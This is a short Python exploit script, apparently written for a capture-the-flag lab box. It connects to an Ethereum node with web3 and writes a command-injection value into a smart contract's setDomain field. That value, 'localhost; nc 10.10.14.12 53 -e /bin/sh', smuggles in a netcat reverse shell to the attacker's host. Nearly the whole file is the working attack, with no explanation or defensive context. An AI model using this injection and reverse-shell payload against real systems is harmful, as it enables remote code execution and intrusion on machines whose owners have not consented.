#!/usr/bin/env python3
# dualfade --
# shouts to w31rd0 & p7r0bl4s7

from web3 import Web3

abi = """
[
 {
   "constant": true,
   "inputs": [],
   "name": "getDomain",
   "outputs": [
     {
       "name": "",
       "type": "string"
     }
   ],
   "payable": false,
   "stateMutability": "view",
   "type": "function"
 },
 {
   "constant": false,
   "inputs": [
     {
       "name": "_value",
       "type": "string"
     }
   ],
   "name": "setDomain",
   "outputs": [],
   "payable": false,
   "stateMutability": "nonpayable",
   "type": "function"
 },
 {
   "constant": false,
   "inputs": [
     {
       "name": "_value",
       "type": "string"
     }
   ],
   "name": "func_02A4",
   "outputs": [
     {
       "name": "_value",
       "type": "string"
     }
   ],
   "payable": false,
   "stateMutability": "nonpayable",
   "type": "function"
 }
]
"""

# target --
web3 = Web3(Web3.HTTPProvider("http://10.10.10.142:9810"))
web3.eth.defaultAccount = web3.eth.accounts[0]

# cat address.txt
# changes each session ?? --
# 0x416e3B739983cb540573cA6b49dC08De63045b3C
contract = web3.eth.contract(address="0x416e3B739983cb540573cA6b49dC08De63045b3C", abi=abi)

# inject reverse shell; contract.functions.setDomain --
test_2 = contract.functions.setDomain("localhost; nc 10.10.14.12 53 -e /bin/sh").transact()
test = contract.functions.getDomain().call()
print(test)

# run --
# :! clear; python3 %
